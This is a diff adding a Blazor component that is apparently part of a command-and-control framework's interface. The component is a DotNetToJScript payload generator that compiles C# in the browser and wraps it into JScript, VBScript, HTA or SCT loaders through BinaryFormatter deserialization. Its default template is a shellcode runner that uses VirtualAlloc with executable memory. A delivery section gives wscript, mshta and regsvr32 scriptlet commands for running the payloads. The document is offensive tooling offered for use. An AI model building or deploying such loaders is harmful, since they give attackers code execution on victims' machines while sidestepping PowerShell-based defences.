@@ -1,0 +1,373 @@
+@inject IJSRuntime JS
+@inject CSharpCompiler Compiler
+
+<div class="tool-panel">
+    <div class="tool-header">
+        <h3 class="tool-title">DotNetToJScript</h3>
+        <p class="tool-subtitle">Generate JScript/VBScript payloads that bootstrap .NET assemblies via BinaryFormatter deserialization.</p>
+    </div>
+
+    <div class="loader-content">
+        <div class="loader-section">
+            <h4 class="loader-section-title">Overview</h4>
+            <p class="loader-text">
+                Generates scripts that deserialize a .NET object via COM-accessible <code>BinaryFormatter</code>,
+                triggering your assembly's entry point without PowerShell or managed EXE — just
+                <code>wscript.exe</code>, <code>cscript.exe</code>, or <code>mshta.exe</code>.
+            </p>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">1 — Input</h4>
+            <div class="loader-tabs">
+                <button class="loader-tab @(_inputMode == InputMode.Source ? "loader-tab--active" : "")"
+                        @onclick="() => SetInputMode(InputMode.Source)">
+                    <C2Icon Name="code" Size="Size.Xs" /> C# Source
+                </button>
+                <button class="loader-tab @(_inputMode == InputMode.Upload ? "loader-tab--active" : "")"
+                        @onclick="() => SetInputMode(InputMode.Upload)">
+                    <C2Icon Name="upload" Size="Size.Xs" /> Upload DLL
+                </button>
+                <button class="loader-tab @(_inputMode == InputMode.Blob ? "loader-tab--active" : "")"
+                        @onclick="() => SetInputMode(InputMode.Blob)">
+                    <C2Icon Name="file-text" Size="Size.Xs" /> Serialized Blob
+                </button>
+            </div>
+
+            @if (_inputMode == InputMode.Source)
+            {
+                <div class="loader-tab-body">
+                    <p class="loader-text loader-hint">
+                        Write your entry class in C#. Compiled in-browser using Roslyn targeting .NET Framework
+                        @(_runtime == Runtime.Net4 ? "4.0" : "2.0"). The class must be <code>[Serializable]</code>
+                        and implement <code>IObjectReference</code>.
+                    </p>
+                    <textarea class="loader-textarea" @bind="_sourceCode" @bind:event="oninput"
+                              rows="18" style="font-family:var(--font-mono);font-size:12px;tab-size:4;"></textarea>
+                    <C2Input Value="@_sourceAssemblyName" ValueChanged="v => _sourceAssemblyName = v" BindOnInput
+                             Placeholder="Assembly name (e.g. TestAssembly)" CssClass="loader-input-spacing" />
+                    <C2Input Value="@_sourceTypeName" ValueChanged="v => _sourceTypeName = v" BindOnInput
+                             Placeholder="Entry class (e.g. TestClass)" CssClass="loader-input-spacing" />
+                    <div class="loader-actions">
+                        <button class="loader-link-btn" @onclick="CompileSource" disabled="@_compiling">
+                            <C2Icon Name="@(_compiling ? "loader" : "code")" Size="Size.Xs" />
+                            @(_compiling ? "Compiling..." : "Compile & Generate")
+                        </button>
+                    </div>
+                    @if (_compileErrors.Length > 0)
+                    {
+                        <pre class="loader-preview" style="color:#e74c3c;font-size:12px;max-height:160px;">@string.Join("\n", _compileErrors)</pre>
+                    }
+                    @if (_compileSuccess)
+                    {
+                        <p class="loader-text loader-hint" style="color:#27ae60;">Compiled successfully — @FormatSize(_dllBytes?.Length ?? 0)</p>
+                    }
+                </div>
+            }
+            else if (_inputMode == InputMode.Upload)
+            {
+                <div class="loader-tab-body">
+                    <p class="loader-text loader-hint">
+                        Upload a .NET assembly DLL. The entry class must be <code>[Serializable]</code> and implement
+                        <code>IObjectReference</code> for code execution on deserialization.
+                    </p>
+                    <div class="loader-actions">
+                        <label class="loader-link-btn" style="cursor:pointer">
+                            <C2Icon Name="upload" Size="Size.Xs" /> Upload DLL
+                            <InputFile OnChange="OnDllUpload" accept=".dll" style="display:none" />
+                        </label>
+                        @if (!string.IsNullOrEmpty(_dllFileName))
+                        {
+                            <span class="loader-text">@_dllFileName (@FormatSize(_dllBytes?.Length ?? 0))</span>
+                        }
+                    </div>
+                    <C2Input Value="@_assemblyName" ValueChanged="v => { _assemblyName = v; Rebuild(); }" BindOnInput
+                             Placeholder="Assembly name (e.g. MyPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null)"
+                             CssClass="loader-input-spacing" />
+                    <C2Input Value="@_typeName" ValueChanged="v => { _typeName = v; Rebuild(); }" BindOnInput
+                             Placeholder="Entry class (e.g. MyNamespace.TestClass)"
+                             CssClass="loader-input-spacing" />
+                </div>
+            }
+            else
+            {
+                <div class="loader-tab-body">
+                    <p class="loader-text loader-hint">
+                        Paste a pre-serialized BinaryFormatter blob (base64). Use this if you generated
+                        the serialized stream externally with the original DotNetToJScript tool.
+                    </p>
+                    <textarea class="loader-textarea" @bind="_rawBlob" @bind:event="oninput" @bind:after="RebuildFromBlob"
+                              placeholder="AAEAAAD/////..." rows="4"></textarea>
+                </div>
+            }
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">2 — Runtime</h4>
+            <div class="loader-tabs">
+                <button class="loader-tab @(_runtime == Runtime.Net4 ? "loader-tab--active" : "")"
+                        @onclick="() => { _runtime = Runtime.Net4; RebuildCurrent(); }">
+                    .NET 4.0
+                </button>
+                <button class="loader-tab @(_runtime == Runtime.Net2 ? "loader-tab--active" : "")"
+                        @onclick="() => { _runtime = Runtime.Net2; RebuildCurrent(); }">
+                    .NET 2.0
+                </button>
+            </div>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">3 — Output</h4>
+            <div class="loader-tabs">
+                <button class="loader-tab @(_format == D2JSFormat.JScript ? "loader-tab--active" : "")"
+                        @onclick="() => { _format = D2JSFormat.JScript; RebuildCurrent(); }">
+                    JScript
+                </button>
+                <button class="loader-tab @(_format == D2JSFormat.VBScript ? "loader-tab--active" : "")"
+                        @onclick="() => { _format = D2JSFormat.VBScript; RebuildCurrent(); }">
+                    VBScript
+                </button>
+                <button class="loader-tab @(_format == D2JSFormat.Hta ? "loader-tab--active" : "")"
+                        @onclick="() => { _format = D2JSFormat.Hta; RebuildCurrent(); }">
+                    HTA
+                </button>
+                <button class="loader-tab @(_format == D2JSFormat.Sct ? "loader-tab--active" : "")"
+                        @onclick="() => { _format = D2JSFormat.Sct; RebuildCurrent(); }">
+                    SCT
+                </button>
+            </div>
+
+            @if (!string.IsNullOrEmpty(_output))
+            {
+                <div class="loader-preview-wrap">
+                    <pre class="loader-preview">@_output</pre>
+                </div>
+                <div class="loader-actions">
+                    <button class="loader-link-btn" @onclick="Download">
+                        <C2Icon Name="download" Size="Size.Xs" /> Download @FormatExtension(_format)
+                    </button>
+                    <button class="loader-copy-btn loader-copy-wide" @onclick="() => Copy(_output)" title="Copy">
+                        <C2Icon Name="copy" Size="Size.Xs" /> Copy
+                    </button>
+                </div>
+            }
+            else
+            {
+                <p class="loader-text loader-hint">Provide input above and generate output.</p>
+            }
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">How It Works</h4>
+            <p class="loader-text">
+                1. Script sets target CLR version via <code>COMPLUS_Version</code> environment variable<br/>
+                2. Base64 payload is decoded to a <code>MemoryStream</code> using .NET COM objects<br/>
+                3. <code>BinaryFormatter.Deserialize</code> instantiates your class from the serialized stream<br/>
+                4. Your class's <code>IObjectReference.GetRealObject()</code> executes the payload<br/>
+                5. Runs under <code>wscript.exe</code> / <code>cscript.exe</code> / <code>mshta.exe</code> — no PowerShell needed
+            </p>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">Delivery</h4>
+            <p class="loader-text">
+                <b>JScript</b> — <code>wscript.exe payload.js</code> or <code>cscript.exe payload.js</code><br/>
+                <b>VBScript</b> — <code>wscript.exe payload.vbs</code> or <code>cscript.exe payload.vbs</code><br/>
+                <b>HTA</b> — <code>mshta.exe payload.hta</code> (runs in a GUI context)<br/>
+                <b>SCT</b> — <code>regsvr32 /s /n /u /i:payload.sct scrobj.dll</code> (no file drop needed if hosted)
+            </p>
+        </div>
+    </div>
+</div>
+
+@code {
+    private enum InputMode { Source, Upload, Blob }
+    private enum Runtime { Net2, Net4 }
+
+    private InputMode _inputMode = InputMode.Source;
+    private Runtime _runtime = Runtime.Net4;
+    private D2JSFormat _format = D2JSFormat.JScript;
+
+    // Upload mode
+    private string _dllFileName = "";
+    private byte[]? _dllBytes;
+    private string _assemblyName = "";
+    private string _typeName = "";
+
+    // Blob mode
+    private string _rawBlob = "";
+
+    // Source mode
+    private string _sourceCode = DefaultTemplate;
+    private string _sourceAssemblyName = "TestAssembly";
+    private string _sourceTypeName = "TestClass";
+    private bool _compiling;
+    private bool _compileSuccess;
+    private string[] _compileErrors = [];
+
+    // Output
+    private string _output = "";
+
+    private string RuntimeVersion => _runtime == Runtime.Net4 ? "v4.0.30319" : "v2.0.50727";
+
+    private const string DefaultTemplate = @"using System;
+using System.Runtime.InteropServices;
+using System.Runtime.Serialization;
+
+[Serializable, ComVisible(true)]
+public class TestClass : IObjectReference
+{
+    delegate void Runner();
+
+    [DllImport(""kernel32"")]
+    static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint type, uint prot);
+
+    public object GetRealObject(StreamingContext ctx)
+    {
+        // Replace with your shellcode
+        byte[] buf = new byte[] { 0xcc };
+
+        // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+        Marshal.Copy(buf, 0, addr, buf.Length);
+
+        Runner run = (Runner)Marshal.GetDelegateForFunctionPointer(addr, typeof(Runner));
+        run();
+
+        return this;
+    }
+}";
+
+    private void SetInputMode(InputMode mode)
+    {
+        _inputMode = mode;
+        _compileSuccess = false;
+        _compileErrors = [];
+        RebuildCurrent();
+    }
+
+    private void RebuildCurrent()
+    {
+        if (_inputMode == InputMode.Blob) RebuildFromBlob();
+        else if (_inputMode == InputMode.Upload) Rebuild();
+        // Source mode rebuilds on Compile click only
+    }
+
+    private async Task CompileSource()
+    {
+        _compiling = true;
+        _compileSuccess = false;
+        _compileErrors = [];
+        _output = "";
+        StateHasChanged();
+
+        var result = await Compiler.CompileAsync(
+            _sourceCode,
+            _sourceAssemblyName,
+            _runtime == Runtime.Net4);
+
+        if (result.Success)
+        {
+            _dllBytes = result.Assembly;
+            _assemblyName = $"{_sourceAssemblyName}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
+            _typeName = _sourceTypeName;
+            _dllFileName = $"{_sourceAssemblyName}.dll";
+            _compileSuccess = true;
+
+            var nrbf = D2JSGenerator.BuildNrbfWithPayload(_assemblyName, _typeName, "raw_bytes", _dllBytes!);
+            var b64 = Convert.ToBase64String(nrbf);
+            _output = D2JSGenerator.Generate(b64, _typeName, _format, RuntimeVersion);
+        }
+        else
+        {
+            _compileErrors = result.Errors;
+        }
+
+        _compiling = false;
+        StateHasChanged();
+    }
+
+    private async Task OnDllUpload(InputFileChangeEventArgs e)
+    {
+        var file = e.File;
+        if (file is null) return;
+
+        _dllFileName = file.Name;
+        using var stream = file.OpenReadStream(maxAllowedSize: 10 * 1024 * 1024);
+        using var ms = new MemoryStream();
+        await stream.CopyToAsync(ms);
+        _dllBytes = ms.ToArray();
+
+        if (string.IsNullOrEmpty(_assemblyName))
+        {
+            var name = System.IO.Path.GetFileNameWithoutExtension(file.Name);
+            _assemblyName = $"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
+        }
+
+        Rebuild();
+        StateHasChanged();
+    }
+
+    private void Rebuild()
+    {
+        if (string.IsNullOrWhiteSpace(_assemblyName) || string.IsNullOrWhiteSpace(_typeName))
+        {
+            _output = "";
+            return;
+        }
+
+        byte[] nrbf;
+        if (_dllBytes is { Length: > 0 })
+            nrbf = D2JSGenerator.BuildNrbfWithPayload(_assemblyName, _typeName, "raw_bytes", _dllBytes);
+        else
+            nrbf = D2JSGenerator.BuildNrbf(_assemblyName, _typeName);
+
+        var b64 = Convert.ToBase64String(nrbf);
+        _output = D2JSGenerator.Generate(b64, _typeName, _format, RuntimeVersion);
+    }
+
+    private void RebuildFromBlob()
+    {
+        if (string.IsNullOrWhiteSpace(_rawBlob))
+        {
+            _output = "";
+            return;
+        }
+        _output = D2JSGenerator.Generate(_rawBlob.Trim(), _typeName, _format, RuntimeVersion);
+    }
+
+    private async Task Download()
+    {
+        var bytes = System.Text.Encoding.UTF8.GetBytes(_output);
+        var base64 = Convert.ToBase64String(bytes);
+        var ext = FormatExtension(_format);
+        await JS.InvokeVoidAsync("eval", $@"
+            (function() {{
+                var a = document.createElement('a');
+                a.href = 'data:application/octet-stream;base64,{base64}';
+                a.download = 'payload{ext}';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }})()
+        ");
+    }
+
+    private static string FormatExtension(D2JSFormat fmt) => fmt switch
+    {
+        D2JSFormat.JScript => ".js",
+        D2JSFormat.VBScript => ".vbs",
+        D2JSFormat.Hta => ".hta",
+        D2JSFormat.Sct => ".sct",
+        _ => ".txt"
+    };
+
+    private static string FormatSize(int bytes)
+    {
+        if (bytes < 1024) return $"{bytes} B";
+        if (bytes < 1024 * 1024) return $"{bytes / 1024.0:F1} KB";
+        return $"{bytes / (1024.0 * 1024.0):F1} MB";
+    }
+
+    private void Copy(string text) => _ = JS.InvokeVoidAsync("navigator.clipboard.writeText", text);
+}
